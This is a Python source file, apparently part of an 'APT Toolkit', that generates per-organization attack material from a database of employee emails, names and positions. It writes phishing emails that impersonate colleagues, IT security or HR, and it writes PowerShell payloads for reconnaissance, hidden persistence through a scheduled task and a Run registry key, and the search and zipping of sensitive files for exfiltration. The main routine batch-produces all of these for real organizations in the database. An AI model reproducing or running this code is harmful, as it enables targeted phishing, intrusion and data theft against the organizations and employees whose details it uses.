#!/usr/bin/env python3
"""
Payload Generator for APT Toolkit

This script generates targeted payloads using data from the emails database.
It can create payloads for specific campaigns, tools, organizations, and categories.
"""

import os
import json
import random
from datetime import datetime
from pathlib import Path

from apt_toolkit.email_repository import open_email_database

class PayloadGenerator:
    def __init__(self, emails_db_path="../emails/unique_emails.db"):
        path = Path(emails_db_path)
        if not path.is_absolute():
            path = (Path(__file__).resolve().parent / path).resolve()
        self.db_path = path
        self.conn = None
        
    def connect(self):
        """Connect to the emails database"""
        if self.conn:
            return
        try:
            self.conn = open_email_database(self.db_path)
        except Exception as exc:  # pragma: no cover - surface readable error
            raise FileNotFoundError(f"Emails database not found at {self.db_path}") from exc
        
    def disconnect(self):
        """Disconnect from the database"""
        if self.conn:
            self.conn.close()
            
    def get_organizations(self):
        """Get list of all organizations from the database"""
        cursor = self.conn.cursor()
        cursor.execute("SELECT DISTINCT organization FROM emails WHERE organization IS NOT NULL ORDER BY organization")
        return [row[0] for row in cursor.fetchall()]
    
    def get_emails_by_organization(self, organization):
        """Get emails for a specific organization"""
        cursor = self.conn.cursor()
        cursor.execute("""
            SELECT email, first_name, last_name, position, department 
            FROM emails 
            WHERE organization = ? 
            ORDER BY RANDOM() 
            LIMIT 50
        """, (organization,))
        return cursor.fetchall()
    
    def get_domains_by_organization(self, organization):
        """Get domains for a specific organization"""
        cursor = self.conn.cursor()
        cursor.execute("""
            SELECT DISTINCT domain 
            FROM emails 
            WHERE organization = ? AND domain IS NOT NULL
        """, (organization,))
        return [row[0] for row in cursor.fetchall()]
    
    def generate_phishing_email_template(self, organization, template_type="generic"):
        """Generate a phishing email template for an organization"""
        emails = self.get_emails_by_organization(organization)
        domains = self.get_domains_by_organization(organization)
        
        if not emails:
            return None
            
        # Select a random sender from the organization
        sender = random.choice(emails)
        sender_email, first_name, last_name, position, department = sender
        
        templates = {
            "generic": {
                "subject": f"Important Update from {organization}",
                "body": f"""Dear Colleague,

This is an important update regarding recent changes at {organization}. Please review the attached document for details.

Best regards,
{first_name} {last_name}
{position}
{organization}
"""
            },
            "security": {
                "subject": f"Security Alert - Password Reset Required",
                "body": f"""Dear {organization} Employee,

Our security system has detected unusual activity on your account. To protect your information, we require you to reset your password immediately.

Please click the link below to reset your password:
[LINK]

If you did not request this change, please contact IT support immediately.

Sincerely,
{first_name} {last_name}
IT Security Department
{organization}
"""
            },
            "hr": {
                "subject": f"HR Policy Update - Action Required",
                "body": f"""Dear Team Member,

Please review the attached HR policy update that requires your immediate attention. All employees must acknowledge receipt by the end of the week.

Thank you for your cooperation.

Best regards,
{first_name} {last_name}
Human Resources
{organization}
"""
            }
        }
        
        template = templates.get(template_type, templates["generic"])
        
        return {
            "organization": organization,
            "sender_email": sender_email,
            "sender_name": f"{first_name} {last_name}",
            "sender_position": position,
            "subject": template["subject"],
            "body": template["body"],
            "domains": domains,
            "generated_at": datetime.now().isoformat()
        }
    
    def generate_powershell_payload(self, campaign_type, organization=None):
        """Generate PowerShell payload for a specific campaign"""
        
        payload_templates = {
            "reconnaissance": """
# PowerShell Reconnaissance Payload for {organization}
# Generated: {timestamp}

function Get-SystemInfo {{
    $systemInfo = @{{
        Hostname = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Username = $env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{$_.InterfaceAlias -eq "Ethernet" -or $_.InterfaceAlias -eq "Wi-Fi"}}).IPAddress
        MACAddress = (Get-NetAdapter | Where-Object {{$_.Status -eq "Up"}}).MacAddress
    }}
    return $systemInfo
}}

function Get-NetworkShares {{
    return Get-SmbShare | Select-Object Name, Path, Description
}}

function Get-InstalledSoftware {{
    return Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor
}}

# Execute reconnaissance
$reconData = @{{
    SystemInfo = Get-SystemInfo
    NetworkShares = Get-NetworkShares
    InstalledSoftware = Get-InstalledSoftware
}}

# Convert to JSON and save to temp file
$reconData | ConvertTo-Json -Depth 3 | Out-File "$env:TEMP\\{org_slug}_recon.json"

Write-Host "Reconnaissance completed for {organization}"
""",
            "persistence": """
# PowerShell Persistence Payload for {organization}
# Generated: {timestamp}

function Add-ScheduledTaskPersistence {{
    $taskName = "{org_slug}_SystemUpdate"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\\Windows\\Temp\\{org_slug}_payload.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
}}

function Add-RegistryPersistence {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    $regName = "{org_slug}_Update"
    $regValue = "powershell.exe -WindowStyle Hidden -File C:\\Windows\\Temp\\{org_slug}_payload.ps1"
    
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force
}}

# Add persistence mechanisms
Add-ScheduledTaskPersistence
Add-RegistryPersistence

Write-Host "Persistence mechanisms added for {organization}"
""",
            "data_exfiltration": """
# PowerShell Data Exfiltration Payload for {organization}
# Generated: {timestamp}

function Find-SensitiveFiles {{
    $extensions = @('.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv', '.pst', '.ost')
    $sensitiveKeywords = @('confidential', 'secret', 'classified', 'password', 'financial', 'budget', 'strategy')
    
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {{$_.Root -ne $null}}
    
    foreach ($drive in $drives) {{
        try {{
            $files = Get-ChildItem -Path $drive.Root -Recurse -Include $extensions -ErrorAction SilentlyContinue | 
                    Where-Object {{$_.Length -lt 10MB}} | 
                    Select-Object -First 100
            
            foreach ($file in $files) {{
                foreach ($keyword in $sensitiveKeywords) {{
                    if ($file.Name -like "*$keyword*") {{
                        $file | Add-Member -NotePropertyName "KeywordMatch" -NotePropertyValue $keyword
                        return $file
                    }}
                }}
            }}
        }} catch {{ }}
    }}
    return $null
}}

function Compress-And-Prepare {{param($filePath)
    $tempZip = "$env:TEMP\\{org_slug}_data.zip"
    Compress-Archive -Path $filePath -DestinationPath $tempZip -Force
    return $tempZip
}}

# Find and prepare sensitive files
$sensitiveFile = Find-SensitiveFiles
if ($sensitiveFile) {{
    $zipPath = Compress-And-Prepare -filePath $sensitiveFile.FullName
    Write-Host "Sensitive file found and prepared: $($sensitiveFile.FullName)"
}} else {{
    Write-Host "No sensitive files found matching criteria"
}}
"""
        }
        
        org_slug = organization.lower().replace(' ', '_').replace('.', '') if organization else "target"
        timestamp = datetime.now().isoformat()
        
        template = payload_templates.get(campaign_type, payload_templates["reconnaissance"])
        return template.format(
            organization=organization or "Target Organization",
            org_slug=org_slug,
            timestamp=timestamp
        )
    
    def save_payload(self, payload_content, file_path):
        """Save payload to file"""
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w') as f:
            f.write(payload_content)
        print(f"Payload saved to: {file_path}")

def main():
    """Main function to demonstrate payload generation"""
    generator = PayloadGenerator()
    
    try:
        generator.connect()
        
        # Generate sample payloads
        organizations = generator.get_organizations()[:3]  # First 3 organizations
        
        for org in organizations:
            print(f"\nGenerating payloads for: {org}")
            
            # Generate phishing email template
            email_template = generator.generate_phishing_email_template(org, "security")
            if email_template:
                org_slug = org.lower().replace(' ', '_').replace('.', '')
                email_file = f"payloads/organizations/{org_slug}/phishing_email.json"
                generator.save_payload(json.dumps(email_template, indent=2), email_file)
            
            # Generate PowerShell payloads
            for payload_type in ["reconnaissance", "persistence", "data_exfiltration"]:
                ps_payload = generator.generate_powershell_payload(payload_type, org)
                ps_file = f"payloads/organizations/{org_slug}/{payload_type}.ps1"
                generator.save_payload(ps_payload, ps_file)
        
        print("\nPayload generation completed!")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        generator.disconnect()

if __name__ == "__main__":
    main()
